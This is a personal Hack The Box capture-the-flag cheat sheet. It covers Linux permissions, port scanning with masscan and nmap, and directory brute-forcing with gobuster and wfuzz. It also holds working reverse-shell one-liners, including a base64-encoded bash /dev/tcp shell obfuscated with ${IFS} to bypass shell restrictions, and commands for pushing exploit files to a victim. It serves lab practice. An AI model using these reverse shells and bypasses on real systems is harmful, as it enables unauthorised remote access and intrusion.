## Hack the Box Reference.<br>
**Contains commands,Link and tricks for challenges**<br>
*gzip*<br>
gzip -d file.gz<br>
*list all file in a directory with permission*<br>
ls -l /home<br>
In the above it is listing all files of home directory with permissions<br>
*list all files with hidden*<br>
ls -a<br>
*show permission of directory or file*<br>
ls -ld<br>
*REVERSE SHELL*<br>
Victim: ncat -e /bin/bash {IP} {PORT}<br>
Attacker: Machine:nc -lvnp {PORT}<br>
python -m SimpleHTTPServer 9999Victim: bash -i >& /dev/tcp/{IP}/{PORT} 0>&1<br>
Attacker: Machine:nc -lvnp {PORT}<br>
Victim(Base64): echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NC85MDA3IDA+JjE|base64${IFS}-d|bash${IFS}-;<br>
Attacker: Machine:nc -lvnp {PORT}<br>

*File transfer during REVERSE SHELL*<br>
Attacker: service apache2 start<br>
place shell or exploit in /var/www/html<br>
Attacker:python -m SimpleHTTPServer 9999<br>
Victim: wget 192.168.1.102:9999/file.txt<br>
Victim: curl -O http://192.168.0.101/file.txt<br>
Attacker:nc -lvp 4444 < /root/home/exploit.txt<br>
Victim:nc 192.168.1.102 4444 > exploit.txt<br>

**masscan probe to establish the open ports in the host.**<br>
#masscan -e tun0 -p1-65535,U:1-65535 10.10.10.101 --rate=700<br>

**nmap scanning the discovered ports to see what are the services.**<br>
#nmap -sV -v -O -sS -T5 {target}<br>

**Gobuster Dir enumeration**<br>
```gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 20 -e -x php,htm,html,txt -u http://target```<br>

**bypass-bash-restrictions**<br>
https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions<br>

**Bypass shell restriction using {IFS} and Base 64 encoding**

```echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NC85MDA3IDA+JjE|base64${IFS}-d|bash${IFS}-;```<br>
it means the highlighted part below is base64 encoded to bypass shell restriction<br>
echo${IFS}**bash -i >& /dev/tcp/10.10.14.94/9007 0>&1**|base64${IFS}-d|bash${IFS}-;<br>
**Understanding Linux File and directory permissions**<br>
d 	r 	w 	x 	r 	w 	x 	r 	w 	x  t<br>
Dir	    Owner 	   Group 	       Other <br>
Directory 	Read 	Write 	Execute 	Read 	Write 	Execute 	Read 	Write 	Execute <br>
t is sticky flag restricted to executed by owner
If any of these letters is replaced with a hyphen (-), it means that permission is not granted.For example <br>
drwxr-xr-x<br>
    A folder which has read, write and execute permissions for the owner, but only read and execute permissions for the group and exe for other users.<br>
-rw-rw-rw-<br>
    A file that can be read and written by anyone, but not executed at all.<br>
    
    
**Understanding Linux File and directory permissions Using Numbers**<br>
No (R) 	 (W) 	(X)<br>
0 	          No 	   No 	           No<br>
1 	          No     No 	           Yes<br>
2 	          No 	   Yes 	            No<br>
3 	          No 	   Yes 	           Yes<br>
4 	          Yes 	  No 	            No<br>
5 	          Yes 	  No 	            Yes<br>
6 	          Yes 	  Yes 	           No<br>
7 	          Yes    	Yes 	          Yes<br>

777 is the same as rwxrwxrwx<br>

755 is the same as rwxr-xr-x<br>

**Dir and File Bruteforce or enumeration**<br>
*WFUZZ*<br>
wfuzz -c -z file,/root/SecLists/Discovery/Web-Content/common.txt --hc 404,400 -X GET -u http://10.10.10.160/FUZZ<br>
